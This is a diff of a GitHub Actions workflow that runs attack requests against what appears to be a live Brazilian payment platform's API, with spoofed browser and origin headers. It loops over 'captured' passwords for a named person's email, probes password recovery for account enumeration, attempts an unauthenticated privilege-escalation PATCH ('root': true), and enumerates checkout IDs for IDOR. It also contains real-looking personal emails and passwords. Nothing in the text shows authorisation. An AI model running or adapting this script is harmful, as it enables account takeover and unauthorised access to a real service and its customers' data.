@@ -1,11 +1,11 @@
-name: waf-500-investigate
+name: waf-whitlabel-investigate
 on:
   workflow_dispatch:
 jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-    - name: Investigate 500 and new endpoints
+    - name: Investigate whitelabel login and theme
       run: |
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
@@ -13,66 +13,75 @@ jobs:
         echo "IP: $(curl -s https://api.ipify.org)"
         
         echo ""
-        echo "=== 500 completo para white-label (fabiane) ==="
-        curl -v -s -m 15 \
-          -A "$UA" \
-          -H "Content-Type: application/json" \
+        echo "=== /users/theme COM Origin petcenterbrasil ==="
+        curl -s -m 15 -A "$UA" \
           -H "Origin: https://petcenterbrasil.wisepay.com.br" \
-          -H "Referer: https://petcenterbrasil.wisepay.com.br/login" \
-          -H "type-application: web" \
-          -H "Sec-Fetch-Site: same-site" \
-          -H "Sec-Fetch-Mode: cors" \
-          -X POST "$BASE/login" \
-          -d '{"email":"fabiane@petcenterbrasil.com.br","password":"08710871"}' \
-          -w "\nSTATUS:%{http_code}" 2>&1 | grep -v "^* " | head -30
-        
-        echo ""
-        echo "=== 500 sem Origin header (fabiane) ==="
-        curl -s -m 15 \
-          -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "type-application: web" \
-          -X POST "$BASE/login" \
-          -d '{"email":"fabiane@petcenterbrasil.com.br","password":"08710871"}' \
-          -w "\nSTATUS:%{http_code}"
-        
-        echo ""
-        echo "=== POST /users (criar conta) ==="
-        curl -s -m 15 \
-          -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "type-application: web" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -X POST "$BASE/users" \
-          -d '{"name":"Carlos Mendes","email":"carlos.mendes874@gmail.com","cpf":"12345678901","phone":"11987654321","password":"Carlos@2024!","password_confirmation":"Carlos@2024!"}' \
-          -w "\nSTATUS:%{http_code}"
-        
-        echo ""
-        echo "=== Password recover para email teste ==="
-        curl -s -m 15 \
-          -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "type-application: web" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -X POST "$BASE/login/password-recover" \
-          -d '{"email":"email-naoexiste-xyzabc999@gmail.com"}' \
-          -w "\nSTATUS:%{http_code}"
-        
-        echo ""
-        echo "=== Password recover para icelaserbelem@gmail.com ==="
-        curl -s -m 15 \
-          -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "type-application: web" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -X POST "$BASE/login/password-recover" \
-          -d '{"email":"icelaserbelem@gmail.com"}' \
-          -w "\nSTATUS:%{http_code}"
-        
-        echo ""
-        echo "=== GET /users/theme sem auth (empresa ID 1 = WisePay root) ==="
-        curl -s -m 15 \
-          -A "$UA" \
           -H "type-application: web" \
           "$BASE/users/theme" \
           -w "\nSTATUS:%{http_code}"
+        
+        echo ""
+        echo "=== POST /login fabiane + todas as senhas capturadas ==="
+        for CRED in "fabiane@petcenterbrasil.com.br:08710871" "fabiane@petcenterbrasil.com.br:67896789" "fabiane@petcenterbrasil.com.br:12341234" "fabiane@petcenterbrasil.com.br:granada2347" "fabiane.br:12341234"; do
+          EMAIL="${CRED%%:*}"
+          PASS="${CRED##*:}"
+          RESP=$(curl -s -m 15 -A "$UA" \
+            -H "Content-Type: application/json" \
+            -H "Origin: https://portal.wisepay.com.br" \
+            -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
+            -H "type-application: web" \
+            -X POST "$BASE/login" \
+            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
+            -w "\n%{http_code}")
+          CODE=$(echo "$RESP" | tail -1)
+          BODY=$(echo "$RESP" | head -1)
+          echo "$CODE $EMAIL:$PASS | $(echo $BODY | head -c 200)"
+        done
+        
+        echo ""
+        echo "=== POST /login/password-recover (email temporário) ==="
+        curl -s -m 15 -A "$UA" \
+          -H "Content-Type: application/json" \
+          -H "type-application: web" \
+          -H "Origin: https://portal.wisepay.com.br" \
+          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
+          -X POST "$BASE/login/password-recover" \
+          -d '{"email":"fabiane@petcenterbrasil.com.br"}' \
+          -w "\nSTATUS:%{http_code}"
+        
+        echo ""
+        echo "=== POST /login/password-recover (email inventado) ==="
+        curl -s -m 15 -A "$UA" \
+          -H "Content-Type: application/json" \
+          -H "type-application: web" \
+          -H "Origin: https://portal.wisepay.com.br" \
+          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
+          -X POST "$BASE/login/password-recover" \
+          -d '{"email":"usuario.inventado.xyz999@gmail.com"}' \
+          -w "\nSTATUS:%{http_code}"
+        
+        echo ""
+        echo "=== P0: PATCH /users sem token (mass assignment test) ==="
+        curl -s -m 15 -A "$UA" \
+          -H "Content-Type: application/json" \
+          -H "type-application: web" \
+          -X PATCH "$BASE/users/1/edit" \
+          -d '{"root": true}' \
+          -w "\nSTATUS:%{http_code}"
+        
+        echo ""
+        echo "=== GET /pagamentos sem token ==="
+        curl -s -m 15 -A "$UA" \
+          -H "type-application: web" \
+          "$BASE/pagamentos" \
+          -w "\nSTATUS:%{http_code}"
+        
+        echo ""
+        echo "=== P1-3: GET /checkout/status (IDOR sem auth) ==="
+        for tid in "WP000001" "W0000001" "00000001" "123456"; do
+          CODE=$(curl -s -m 10 -A "$UA" \
+            -H "type-application: web" \
+            "$BASE/checkout/status/$tid" \
+            -w "%{http_code}" -o /dev/null)
+          echo "$CODE $tid"
+        done
